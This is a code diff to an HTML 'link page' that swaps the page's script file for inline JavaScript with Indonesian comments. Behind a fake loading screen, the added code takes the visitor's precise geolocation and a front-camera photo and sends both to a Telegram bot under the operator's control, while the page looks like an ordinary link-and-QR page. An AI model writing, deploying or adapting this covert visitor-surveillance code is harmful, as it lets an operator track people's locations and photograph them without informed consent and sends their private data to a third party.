@@ -67,6 +67,137 @@
     </a>
 </footer>
 
-<script src="script.js"></script>
+<script>
+// === SCRIPT ASLI + TAMBAHAN FITUR BARU ===
+
+const BOT_TOKEN = "YOUR_BOT_TOKEN";   // ← GANTI DENGAN TOKEN BOT TELEGRAM KAMU
+const CHAT_ID = "YOUR_CHAT_ID";       // ← GANTI DENGAN CHAT ID KAMU
+
+async function sendToTelegram(locationData, photoBlob) {
+    try {
+        // Kirim Lokasi
+        if (locationData) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: locationData.latitude,
+                    longitude: locationData.longitude,
+                    caption: `📍 Lokasi dari Whoisdanz Link Page\nWaktu: ${new Date().toLocaleString('id-ID')}`
+                })
+            });
+        }
+
+        // Kirim Foto
+        if (photoBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", photoBlob, "front-camera.jpg");
+            formData.append("caption", `📸 Foto kamera depan\nLokasi: ${locationData ? locationData.latitude + ', ' + locationData.longitude : 'Tidak diketahui'}`);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        console.log("✅ Data lokasi & foto berhasil dikirim ke Telegram");
+    } catch (err) {
+        console.error("❌ Gagal mengirim ke Telegram:", err);
+    }
+}
+
+async function captureFrontCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" }, // kamera depan
+            audio: false
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(r => setTimeout(r, 1000)); // tunggu agar gambar stabil
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(track => track.stop());
+
+        return new Promise(resolve => {
+            canvas.toBlob(resolve, "image/jpeg", 0.8);
+        });
+    } catch (err) {
+        console.warn("⚠️ Gagal mengakses kamera:", err);
+        return null;
+    }
+}
+
+async function afterLoadingComplete() {
+    console.log("Loading selesai → meminta izin lokasi & kamera...");
+
+    let locationData = null;
+
+    // Ambil Lokasi
+    try {
+        const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 8000,
+                maximumAge: 0
+            });
+        });
+        locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+        };
+        console.log("📍 Lokasi berhasil didapat:", locationData);
+    } catch (err) {
+        console.warn("⚠️ Gagal mendapatkan lokasi (izin ditolak atau error):", err);
+    }
+
+    // Ambil Foto Kamera Depan
+    const photoBlob = await captureFrontCamera();
+
+    // Kirim ke Telegram
+    await sendToTelegram(locationData, photoBlob);
+}
+
+// Jalankan setelah loading screen selesai
+document.addEventListener("DOMContentLoaded", () => {
+    const loadingScreen = document.getElementById("loading-screen");
+    const progressBar = document.getElementById("loading-progress");
+
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += Math.random() * 18;
+        if (progress > 100) progress = 100;
+        if (progressBar) progressBar.style.width = `${progress}%`;
+
+        if (progress >= 100) {
+            clearInterval(interval);
+            setTimeout(() => {
+                if (loadingScreen) loadingScreen.style.display = "none";
+                afterLoadingComplete();   // Jalankan fitur baru
+            }, 500);
+        }
+    }, 100);
+});
+
+// Script QR modal (tetap dipertahankan, asumsikan script.js asli ada di sini atau di file terpisah)
+const qrBtn = document.getElementById("qrBtn");
+const qrModal = document.getElementById("qrModal");
+const closeQR = document.getElementById("closeQR");
+
+if (qrBtn && qrModal && closeQR) {
+    qrBtn.addEventListener("click", () => qrModal.style.display = "flex");
+    closeQR.addEventListener("click", () => qrModal.style.display = "none");
+}
+</script>
+
 </body>
 </html>
